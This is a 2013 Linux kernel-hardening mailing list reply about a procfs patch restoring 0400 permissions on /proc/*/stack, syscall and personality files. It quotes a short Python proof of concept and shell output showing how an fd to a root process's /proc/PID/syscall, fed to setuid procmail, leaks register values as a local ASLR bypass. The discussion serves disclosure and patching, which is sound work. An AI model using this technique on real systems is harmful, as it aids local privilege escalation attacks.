Reply-To: kernel-hardening@lists.openwall.com
Date: Wed, 28 Aug 2013 22:11:17 +0100
From: Djalal Harouni <tixxdz@opendz.org>
Message-ID: <20130828211116.GA22184@dztty>
References: <1377534240-13227-1-git-send-email-tixxdz@opendz.org>
 <871u5gqtw3.fsf@xmission.com>
 <20130826172054.GE27005@ZenIV.linux.org.uk>
 <20130827172406.GA2664@dztty>
 <20130828201141.GA21455@dztty>
 <CAGXu5jJ2yop1JrJT1nzKWoT_Q83s9fGK_2BuBcCotHCR9YecDQ@mail.gmail.com>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
In-Reply-To: <CAGXu5jJ2yop1JrJT1nzKWoT_Q83s9fGK_2BuBcCotHCR9YecDQ@mail.gmail.com>
Subject: [kernel-hardening] Re: [PATCH 1/2] procfs: restore 0400 permissions on
 /proc/*/{syscall,stack,personality}
To: Kees Cook <keescook@chromium.org>
Cc: Al Viro <viro@zeniv.linux.org.uk>, "Eric W. Biederman" <ebiederm@xmission.com>, Andrew Morton <akpm@linux-foundation.org>, Solar Designer <solar@openwall.com>, Vasiliy Kulikov <segoon@openwall.com>, Linus Torvalds <torvalds@linux-foundation.org>, Ingo Molnar <mingo@kernel.org>, LKML <linux-kernel@vger.kernel.org>, "kernel-hardening@lists.openwall.com" <kernel-hardening@lists.openwall.com>
List-ID: <kernel-hardening.lists.openwall.com>

On Wed, Aug 28, 2013 at 01:49:06PM -0700, Kees Cook wrote:
> On Wed, Aug 28, 2013 at 1:11 PM, Djalal Harouni <tixxdz@opendz.org> wrote:
[...]
> >> 2)
> >> The commit log says also:
> >> "if you open a file before the target does suid-root exec, you'll be still
> >> able to access it." so you do the task is tracable check at read()
> >>
> >> But what if you open a file of a privileged target or a target that does
> >> suid-root exec later, and pass the fd to a suid-root exec to read() from
> >> it later, you will still pass that tracable check.
> >>
> >> And currently a non-privileged process can get an fd on all these
> >> /proc/*/stack files even root owned ones.
> >>
> >> So why not restore the old behaviour and block a process from getting an
> >> fd on /proc/*/stack files that belong to other processes?
> >>
> >>
> >> The original thread that added the /proc/*/stack feature:
> >> https://lkml.org/lkml/2008/11/7/109
> >>
> >> They noted that it should be under 0400 permissions
> 
> Yes, this was discussed years ago -- these files must be 0400 _and_
> perform at-read checks.
> 
> https://lkml.org/lkml/2011/2/10/21
> 
> This is all related to
> http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1020
> 
> Which had the following fixes, but broken file access perms in several places:
> 
> http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=a9712bc12c40c172e393f85a9b2ba8db4bf59509
> http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=2fadaef41283aad7100fa73f01998cddaca25833
> http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=d6f64b89d7ff22ce05896ab4a93a653e8d0b123d
> http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=ec6fd8a4355cda81cd9f06bebc048e83eb514ac7
> http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=ca6b0bf0e086513b9ee5efc0aa5770ecb57778af
Yes thanks Kees, they are all related.


> > tixxdz@dztty-qemu:~$ id
> > uid=1000(tixxdz) gid=1000(tixxdz)
> > groups=1000(tixxdz),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
> >
> > tixxdz@dztty-qemu:~$ ls -lha ./a.out
> > -rwxr-xr-x 1 tixxdz tixxdz 8.0K Aug 28 20:26 ./a.out
> >
> > tixxdz@dztty-qemu:~$ ls -lha /usr/bin/procmail
> > -rwsr-sr-x 1 root mail 88K Apr 25  2010 /usr/bin/procmail
> >
> > (procmail with -d needs setuid())
> >
> > tixxdz@dztty-qemu:~$ for i in $(seq 1 10); do ./a.out /usr/bin/procmail
> > /proc/$i/stack ; done
> 
> Can you include your C file for your a.out? I assume you're opening
> /proc/$i/stack and duping to stdin for a "procmail -d tixxdz" call,
> and I can reproduce this with the following python, but I want to be
> sure I'm seeing the same bug.
Yes it's exaclty the same PoC and bug


> #!/usr/bin/python
> import sys
> from subprocess import call
> call(["/usr/bin/procmail", "-d", sys.argv[2]], stdin=open(sys.argv[1]))
> 
> 
> $ ps -ef | grep apache2 | grep root
> root      3781     1  0 Jul28 ?        00:00:37 /usr/sbin/apache2 -k start
> $ cat /proc/3781/stack
> cat: /proc/3781/stack: Operation not permitted
> $ /tmp/dup-stdin.py /proc/3781/syscall kees
> $ cat /var/mail/kees
> 23 0x0 0x0 0x0 0x0 0x7fffa29c9cf0 0x1 0x7fffa29c9d18 0x7f1b76bbd233
> 
> So, local ASLR bypass using a setuid helper.
> 
> One shouldn't be able to open these files in the first place.
Yes that's what I've been trying to say:
https://lkml.org/lkml/2013/8/26/354

Hope that Al will peek the patches.

Thanks

-- 
Djalal Harouni
http://opendz.org
